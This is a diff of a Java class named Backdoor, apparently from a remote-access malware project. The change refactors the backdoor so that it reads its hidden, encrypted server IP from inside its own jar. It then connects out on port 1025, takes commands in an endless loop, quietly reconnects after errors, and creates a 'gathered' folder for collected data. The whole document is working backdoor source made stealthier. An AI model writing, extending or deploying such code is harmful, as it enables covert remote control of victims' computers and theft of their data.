@@ -14,27 +14,40 @@ public class Backdoor {
 	public static PrintWriter out;
 
 	/**
-	 * Starts backdoor shell.
-	 *
-	 * Creates 'gathered' directory and sets {@link ip} to server IP address using
-	 * {@link args}.
-	 * <p>
-	 * Attempts to connect to server with {@link ip} on port 1025. Once connected,
-	 * initiates {@link in} and {@link out} and starts infinite loop that gets
-	 * command from server with {@link in} and handles command with
-	 * {@link HandleCommand.handle(String command)}. If exception is thrown,
-	 * {@link socket}, {@link in}, and {@link out} are closed and
-	 * {@link main(String[] args} is run.
-	 *
-	 * @param args Command line arguments
+	 * Constructs and starts a new Backdoor.
+	 * 
+	 * @param args command line arguments
 	 */
 	public static void main(String[] args) {
+		Backdoor backdoor = new Backdoor();
+		backdoor.start();
+	}
+
+	/**
+	 * Uses {@link #readFromJar(String)} to get the contents of "ip", an encrypted
+	 * plain text file, inside the jar file this class is running from, with the
+	 * IPv4 address of the server. Creates directory "gathered".
+	 */
+	private Backdoor() {
 		try {
-			ip = Utils.crypt(args[0], "BetterBackdoorIP");
+			ip = Utils.crypt(readFromJar("/ip"), "BetterBackdoorIP");
 			new File("gathered").mkdir();
 		} catch (Exception e) {
 			System.exit(0);
 		}
+	}
+
+	/**
+	 * Starts backdoor shell.
+	 * <p>
+	 * Attempts to connect to server with {@link ip} on port 1025. Once connected,
+	 * initiates {@link in} and {@link out} and starts infinite loop that gets
+	 * command from server with {@link in} and handles command with
+	 * {@link HandleCommand#handle(String command)}. If exception is thrown,
+	 * {@link socket}, {@link in}, and {@link out} are closed and {@link #start()}
+	 * is run.
+	 */
+	private void start() {
 		try {
 			while (true)
 				try {
@@ -58,10 +71,25 @@ public class Backdoor {
 					in.close();
 				if (out != null)
 					out.close();
-				main(args);
+				start();
 			} catch (Exception e1) {
 				System.exit(0);
 			}
 		}
+	}
+
+	/**
+	 * Gets the contents of the file with name {@link filename} from inside the jar
+	 * file this class is running from.
+	 * 
+	 * @param filename name of file
+	 * @return contents of file with name {@link filename}
+	 */
+	private String readFromJar(String filename) {
+		String ret = null;
+		Scanner in = new Scanner(getClass().getResourceAsStream(filename));
+		ret = in.nextLine();
+		in.close();
+		return ret;
 	}
 }
